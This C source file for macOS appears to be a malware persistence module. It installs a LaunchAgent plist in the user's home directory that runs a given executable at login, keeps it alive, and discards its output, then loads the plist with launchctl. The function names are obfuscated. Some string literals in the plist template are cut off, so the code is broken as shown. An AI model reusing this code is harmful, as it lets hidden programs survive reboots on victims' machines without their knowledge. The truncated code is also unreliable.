#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <spawn.h>
extern char **environ;
static void run(const char *bin, char *const argv[]) {
    pid_t pid;
    posix_spawn(&pid, bin, NULL, NULL, argv, environ);
    int s; waitpid(pid, &s, 0);
}
void bqxrtmnp(const char *label, const char *exec_path) {
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return;
    char plist_dir[512], plist_path[640];
    snprintf(plist_dir,  sizeof(plist_dir),
             "%s/Library/LaunchAgents", pw->pw_dir);
    snprintf(plist_path, sizeof(plist_path),
             "%s/%s.plist", plist_dir, label);
    if (access(plist_path, F_OK) == 0) return;
    mkdir(plist_dir, 0755);
    FILE *f = fopen(plist_path, "w");
    if (!f) return;
    fprintf(f,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-
        " \"http:
        "<plist version=\"1.0\"><dict>\n"
        "  <key>Label</key><string>%s</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array><string>%s</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "  <key>KeepAlive</key><true/>\n"
        "  <key>StandardErrorPath</key><string>/dev/null</string>\n"
        "  <key>StandardOutPath</key><string>/dev/null</string>\n"
        "</dict></plist>\n",
        label, exec_path);
    fclose(f);
    char *load_argv[] = { "launchctl", "load", plist_path, NULL };
    run("/bin/launchctl", load_argv);
}
int vtxqbrmn(const char *label) {
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return 0;
    char plist_path[640];
    snprintf(plist_path, sizeof(plist_path),
             "%s/Library/LaunchAgents/%s.plist", pw->pw_dir, label);
    return access(plist_path, F_OK) == 0;
}
